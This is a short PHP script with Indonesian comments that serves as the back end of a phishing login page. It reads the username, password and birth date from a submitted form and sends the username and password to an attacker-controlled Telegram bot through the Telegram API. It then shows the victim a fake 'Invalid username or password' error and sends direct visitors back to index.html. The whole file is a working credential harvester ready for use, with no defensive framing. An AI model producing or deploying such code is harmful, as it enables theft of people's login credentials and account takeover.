<?php
// Ganti token_bot dan chat_id sesuai dengan informasi Telegram Anda
$token_bot = 'TOKEN_BOT_TELEGRAM';
$chat_id = 'CHAT_ID_TELEGRAM';

// Fungsi untuk mengirim pesan ke Telegram
function sendMessageToTelegram($message)
{
    global $token_bot, $chat_id;
    $url = "https://api.telegram.org/bot$token_bot/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
    file_get_contents($url);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Mengambil data dari formulir
    $username = $_POST['username'];
    $password = $_POST['password'];
    $lahir = $_POST['lahir'];

    // Menyusun pesan untuk dikirim ke Telegram
    $message = "New Login Attempt:\n\n";
    $message .= "Username/Email/Phone: $username\n";
    $message .= "Password: $password\n";
    $message .= "Date: " . date("Y-m-d H:i:s");

    // Mengirim pesan ke Telegram
    sendMessageToTelegram($message);

    // Menampilkan pesan error kepada pengguna
    echo json_encode(array('error' => 'Invalid username or password. Please try again.'));
} else {
    // Jika akses langsung ke file ini tanpa melalui formulir, redirect ke halaman utama atau halaman error
    header("Location: index.html"); // Ganti dengan halaman yang sesuai
    exit();
}
?>
